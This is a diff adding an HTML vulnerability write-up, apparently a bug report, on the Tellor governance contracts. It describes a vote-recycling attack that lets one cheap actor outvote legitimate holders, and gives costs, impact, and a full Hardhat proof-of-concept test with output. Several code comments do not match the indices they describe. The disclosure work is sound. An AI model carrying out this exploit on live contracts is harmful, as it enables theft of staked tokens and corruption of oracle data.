@@ -1,0 +1,427 @@
+﻿<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TellorV2</title>
+  <link rel="stylesheet" href="https://stackedit.io/style.css" />
+</head>
+
+<body class="stackedit">
+  <div class="stackedit__html"><h2 id="strategy-t-007--dominate-votes-in-24-almost-free-use-1-staker-cost-100-trb">STRATEGY [T-007] : DOMINATE VOTES IN 2/4 ALMOST FREE, USE 1 STAKER (COST: 100 TRB)</h2>
+<p>This test has been setup based on actual and current on-chain numbers for the legitimate users.</p>
+<h3 id="testing-setup">Testing setup:</h3>
+<p><strong>Ratios:</strong></p>
+<p>Legitimate:</p>
+<ul>
+<li>
+<p>legitimateAutopayUsers: 2</p>
+</li>
+<li>
+<p>legitimateTokenHolders: 50</p>
+</li>
+<li>
+<p>legitimateReporters: 10</p>
+</li>
+<li>
+<p>multisig: 1</p>
+</li>
+</ul>
+<p>Malicous:</p>
+<ul>
+<li>
+<p>maliciousAutopayUsers: 100</p>
+</li>
+<li>
+<p>maliciousRecyclers: 168</p>
+</li>
+<li>
+<p>maliciousReporters: 1</p>
+</li>
+</ul>
+<p>COST ANALYSIS: 100 TRB</p>
+<p><strong>STATUS: PASS [OVERRULED BY MALICIOUS ACTORS]</strong></p>
+<h3 id="impact">Impact:</h3>
+<p>Once the malicious actors have enough votes, they can override the legitimate votes and change the outcome of the vote. This includes, but is not limited to:</p>
+<ul>
+<li>
+<p>Changing the outcome of the votes</p>
+</li>
+<li>
+<p>Slashing legitimate reporters and steal their TRB</p>
+</li>
+<li>
+<p>Block the Tellor oracle from being used</p>
+</li>
+<li>
+<p>Submit false values to the Tellor oracle</p>
+</li>
+</ul>
+<p>Each successfull manipulated vote further increased the power of the malicious actor, since they keep gaining more votes and more TRB.</p>
+<h3 id="proof">Proof:</h3>
+<pre class=" language-javascript"><code class="prism  language-javascript">
+Total  accounts available<span class="token punctuation">:</span> <span class="token number">2010</span>
+
+Dispute started<span class="token punctuation">.</span> Beginning  voting<span class="token operator">...</span>
+
+Legitimate  voting complete<span class="token punctuation">.</span> Now  starting  malicious  voting<span class="token operator">...</span>
+
+All  voting complete<span class="token punctuation">.</span> Tallying  votes<span class="token operator">...</span>
+
+VOTING RESULTS<span class="token punctuation">:</span>
+
+Legitimate  <span class="token function">tokenholders</span> <span class="token punctuation">(</span>support<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">2100000000000000000000</span>
+
+Malicious  <span class="token function">recyclers</span> <span class="token punctuation">(</span>against<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">1680010000000000000000000</span>
+
+Legitimate  <span class="token function">users</span> <span class="token punctuation">(</span>support<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">2000000000000000000</span>
+
+Malicious  <span class="token function">users</span> <span class="token punctuation">(</span>against<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">100000000000000000000</span>
+
+Legitimate  <span class="token function">reporters</span> <span class="token punctuation">(</span>support<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">10</span>
+
+Malicious  <span class="token function">reporters</span> <span class="token punctuation">(</span>against<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">1</span>
+
+<span class="token function">Multisig</span> <span class="token punctuation">(</span>support<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">1</span>
+
+Vote outcome<span class="token punctuation">:</span> FAILED
+
+ATTACK SUCCESSFUL<span class="token punctuation">:</span> Malicious  actors  overruled  legitimate  votes
+
+</code></pre>
+<h3 id="feasibility">Feasibility:</h3>
+<ul>
+<li>
+<p>100 TRB available on Uniswap V2 and V3</p>
+</li>
+<li>
+<p>Needed cost to setup 100 autopay users is 100 * 1 WEI = 0,0000000000000001</p>
+</li>
+<li>
+<p>Needed cost to vote with 168 users is 168 * 10000 WEI = 0,00000000000168 TRB</p>
+</li>
+<li>
+<p>Needed cost to become a staker and vote as reporter = 100 TRB</p>
+</li>
+<li>
+<p>Total cost: 100 TRB + 0,000000000001 TRB = ~100,00000000001 TRB</p>
+</li>
+<li>
+<p>It only takes the minimum time defined by the contract for a malicious actor to execute this exploit vector.</p>
+</li>
+</ul>
+<h3 id="proof-of-code">Proof of code:</h3>
+<ul>
+<li><code>git clone</code> <a href="https://github.com/tellor-io/governance">https://github.com/tellor-io/governance</a></li>
+<li>Open test file <code>governance/test/e2eTests.js</code></li>
+<li>Add this test code to the file (or create a new file):</li>
+</ul>
+<pre><code>it("[T-007] Test legitimate users vs malicious actors voting power", async  function () {
+
+// Check if we have enough accounts
+
+if (accounts.length &lt; 500) {
+
+console.log("Not enough accounts available. Test skipped.");
+
+return;
+
+}
+
+  
+
+console.log(`Total accounts available: ${accounts.length}`);
+
+  
+
+// Setup accounts with clear separation and no overlap
+
+const  legitimateAutopayUsers = accounts.slice(0, 2); // 2 legitimate autopay users (0-1)
+
+const  legitimateTokenHolders = accounts.slice(10, 60); // 50 legitimate token holders (10-59)
+
+const  legitimateReporters = accounts.slice(100, 110); // 50 legitimate reporters (100-149)
+
+const  multisig = accounts[200]; // Legitimate multisig (200)
+
+  
+
+const  maliciousAutopayUsers = accounts.slice(700, 800); // 100 malicious autopay users (210-229)
+
+const  maliciousRecyclers = accounts.slice(231, 399); // 168 accounts for recycling (240-289)
+
+const  maliciousReporters = accounts.slice(600, 601); // 50 malicious reporters (300-349)
+
+  
+
+const  disputeStarter = accounts[400]; // Dispute starter (400)
+
+const  valueSubmitter = accounts[401]; // Value submitter (401)
+
+const  oracleSubmitter = accounts[402]; // Oracle submitter (402)
+
+  
+
+// Setup autopay addresses in oracle
+
+await  token.mint(oracleSubmitter.address, web3.utils.toWei("10"));
+
+await  token.connect(oracleSubmitter).approve(flex.address, web3.utils.toWei("10"));
+
+await  flex.connect(oracleSubmitter).depositStake(web3.utils.toWei("10"));
+
+await  flex.connect(oracleSubmitter).submitValue(autopayQueryId, autopayArray, 0, autopayQueryData);
+
+await h.advanceTime(86400);
+
+  
+
+// Setup legitimate autopay users
+
+for (let  i = 0; i &lt; legitimateAutopayUsers.length; i++) {
+
+await  token.mint(legitimateAutopayUsers[i].address, web3.utils.toWei("1"));
+
+await  token.connect(legitimateAutopayUsers[i]).approve(autopay.address, web3.utils.toWei("1"));
+
+await  autopay.connect(legitimateAutopayUsers[i]).tip(ETH_QUERY_ID, web3.utils.toWei("1"), ETH_QUERY_DATA);
+
+}
+
+  
+
+// Setup legitimate token holders
+
+for (let  i = 0; i &lt; legitimateTokenHolders.length; i++) {
+
+await  token.mint(legitimateTokenHolders[i].address, web3.utils.toWei("20"));
+
+}
+
+  
+
+// Setup legitimate reporters
+
+for (let  i = 0; i &lt; legitimateReporters.length; i++) {
+
+await  token.mint(legitimateReporters[i].address, web3.utils.toWei("10"));
+
+await  token.connect(legitimateReporters[i]).approve(flex.address, web3.utils.toWei("10"));
+
+await  flex.connect(legitimateReporters[i]).depositStake(web3.utils.toWei("10"));
+
+// Use different query IDs for each reporter to avoid timestamp conflicts
+
+const  uniqueQueryData = `0x${i.toString().padStart(64, '0')}`;
+
+await  flex.connect(legitimateReporters[i]).submitValue(h.hash(uniqueQueryData), h.bytes(100), 0, uniqueQueryData);
+
+}
+
+  
+
+// Setup malicious autopay users (more than legitimate)
+
+for (let  i = 0; i &lt; maliciousAutopayUsers.length; i++) {
+
+await  token.mint(maliciousAutopayUsers[i].address, web3.utils.toWei("1"));
+
+await  token.connect(maliciousAutopayUsers[i]).approve(autopay.address, web3.utils.toWei("1"));
+
+await  autopay.connect(maliciousAutopayUsers[i]).tip(ETH_QUERY_ID, web3.utils.toWei("1"), ETH_QUERY_DATA);
+
+}
+
+  
+
+// Setup malicious reporters (more than legitimate ones)
+
+for (let  i = 0; i &lt; maliciousReporters.length; i++) {
+
+await  token.mint(maliciousReporters[i].address, web3.utils.toWei("10"));
+
+await  token.connect(maliciousReporters[i]).approve(flex.address, web3.utils.toWei("10"));
+
+await  flex.connect(maliciousReporters[i]).depositStake(web3.utils.toWei("10"));
+
+// Use different query IDs for each reporter
+
+const  uniqueQueryData = `0x${(i + 1000).toString().padStart(64, '0')}`;
+
+await  flex.connect(maliciousReporters[i]).submitValue(h.hash(uniqueQueryData), h.bytes(100), 0, uniqueQueryData);
+
+}
+
+await h.advanceTime(86400);
+
+  
+
+// Setup malicious recyclers with initial funds (much more than legitimate)
+
+await  token.mint(maliciousRecyclers[0].address, web3.utils.toWei("10000")); // 10x more
+
+  
+
+// Submit a value to dispute
+
+await  token.mint(valueSubmitter.address, web3.utils.toWei("10"));
+
+await  token.connect(valueSubmitter).approve(flex.address, web3.utils.toWei("10"));
+
+await  flex.connect(valueSubmitter).depositStake(web3.utils.toWei("10"));
+
+await  flex.connect(valueSubmitter).submitValue(ETH_QUERY_ID, h.bytes(100), 0, ETH_QUERY_DATA);
+
+const  blocky = await h.getBlock();
+
+  
+
+// Begin dispute
+
+await  token.mint(disputeStarter.address, web3.utils.toWei("10"));
+
+await  token.connect(disputeStarter).approve(gov.address, web3.utils.toWei("10"));
+
+await  gov.connect(disputeStarter).beginDispute(ETH_QUERY_ID, blocky.timestamp);
+
+  
+
+console.log("Dispute started. Beginning voting...");
+
+  
+
+// Legitimate votes: all legitimate groups vote in SUPPORT
+
+for (let  i = 0; i &lt; legitimateAutopayUsers.length; i++) {
+
+await  gov.connect(legitimateAutopayUsers[i]).vote(1, true, false);
+
+}
+
+  
+
+for (let  i = 0; i &lt; legitimateTokenHolders.length; i++) {
+
+await  gov.connect(legitimateTokenHolders[i]).vote(1, true, false);
+
+}
+
+  
+
+for (let  i = 0; i &lt; legitimateReporters.length; i++) {
+
+await  gov.connect(legitimateReporters[i]).vote(1, true, false);
+
+}
+
+  
+
+await  gov.connect(multisig).vote(1, true, false);
+
+  
+
+console.log("Legitimate voting complete. Now starting malicious voting...");
+
+  
+
+// Malicious votes: all malicious actors vote AGAINST
+
+for (let  i = 0; i &lt; maliciousAutopayUsers.length; i++) {
+
+await  gov.connect(maliciousAutopayUsers[i]).vote(1, false, false);
+
+}
+
+  
+
+// Recycle funds across accounts and vote against
+
+for (let  i = 0; i &lt; maliciousRecyclers.length; i++) {
+
+await  gov.connect(maliciousRecyclers[i]).vote(1, false, false);
+
+  
+
+if (i &lt; maliciousRecyclers.length - 1) {
+
+const  balance = await  token.balanceOf(maliciousRecyclers[i].address);
+
+await  token.connect(maliciousRecyclers[i]).transfer(maliciousRecyclers[i + 1].address, balance);
+
+}
+
+}
+
+  
+
+for (let  i = 0; i &lt; maliciousReporters.length; i++) {
+
+await  gov.connect(maliciousReporters[i]).vote(1, false, false);
+
+}
+
+  
+
+console.log("All voting complete. Tallying votes...");
+
+  
+
+// Tally and execute
+
+await h.advanceTime(86400 * 2);
+
+await  gov.tallyVotes(1);
+
+await h.advanceTime(86400);
+
+await  gov.executeVote(1);
+
+  
+
+// Get vote info
+
+const  voteInfo = await  gov.getVoteInfo(1);
+
+  
+
+// Log results
+
+console.log("VOTING RESULTS:");
+
+console.log("Legitimate tokenholders (support):", voteInfo[1][5].toString());
+
+console.log("Malicious recyclers (against):", voteInfo[1][6].toString());
+
+console.log("Legitimate users (support):", voteInfo[1][8].toString());
+
+console.log("Malicious users (against):", voteInfo[1][9].toString());
+
+console.log("Legitimate reporters (support):", voteInfo[1][11].toString());
+
+console.log("Malicious reporters (against):", voteInfo[1][12].toString());
+
+console.log("Multisig (support):", voteInfo[1][14].toString());
+
+console.log("Vote outcome:", voteInfo[3] == 1  ?  "PASSED"  :  "FAILED");
+
+  
+
+// Check if malicious actors were able to overrule legitimate votes
+
+if (voteInfo[3] == 0) {
+
+console.log("ATTACK SUCCESSFUL: Malicious actors overruled legitimate votes");
+
+} else {
+
+console.log("ATTACK FAILED: Legitimate votes prevailed");
+
+}
+
+});
+</code></pre>
+</div>
+</body>
+
+</html>
